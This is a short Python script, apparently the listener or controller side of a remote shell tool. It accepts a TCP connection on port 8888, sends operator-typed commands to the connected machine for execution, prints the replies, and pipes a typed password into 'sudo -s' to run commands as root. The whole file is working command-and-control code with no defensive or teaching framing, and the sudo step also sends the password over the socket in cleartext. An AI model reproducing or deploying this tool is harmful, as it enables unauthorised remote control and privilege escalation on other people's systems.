import socket,threading,time,sys

ip = '172.25.165.15'
port = 8888
ADDRESS = (ip,port)


SERVER_SOCKET = socket.socket(socket.AF_INET,socket.SOCK_STREAM)     #Creates TCP server socket
SERVER_SOCKET.bind(ADDRESS)     #binds socket to address
print('[*]Server socket binded')        

SERVER_SOCKET.listen(5)
print(f'[*]Listening for connections at {ip}:{port}')


while True:
    CLIENT_SOCKET, CLIENT_ADDRESS = SERVER_SOCKET.accept()
    break;

print(f'[*]Connection established with {str(CLIENT_ADDRESS)}.')

while True:
    CMD_INPUT = input('TCPshell> ')
    
    if CMD_INPUT == 'close connection':     #handles close connection command

        print(f'[*]Sending close connection message')
        CLIENT_SOCKET.send(bytes('CLOSE_CONNECTION','utf-8'))
        
        break
    
    elif CMD_INPUT[0:4] == "sudo":          #handles commands requiring sudo

        PW = input("password: ")
        print(f'[*]Sending command: {CMD_INPUT}')

        CLIENT_SOCKET.send(bytes(f"echo {PW} | sudo -s {CMD_INPUT[5:]}", 'utf-8'))

        BUFFER_SIZE = int(CLIENT_SOCKET.recv(1068).decode('utf-8'))    #recieves buffersize before actual reply
        REPLY = CLIENT_SOCKET.recv(BUFFER_SIZE).decode('utf-8')
        print(f'[*]Recieved:\n{REPLY}')

    else:
        print(f'[*]Sending command: {CMD_INPUT}')

        CLIENT_SOCKET.send(bytes(CMD_INPUT, 'utf-8'))

        BUFFER_SIZE = int(CLIENT_SOCKET.recv(1068).decode('utf-8'))      #recieves buffersize before actual reply
        REPLY = CLIENT_SOCKET.recv(BUFFER_SIZE).decode('utf-8')
        print(f'[*]Recieved:\n{REPLY}')
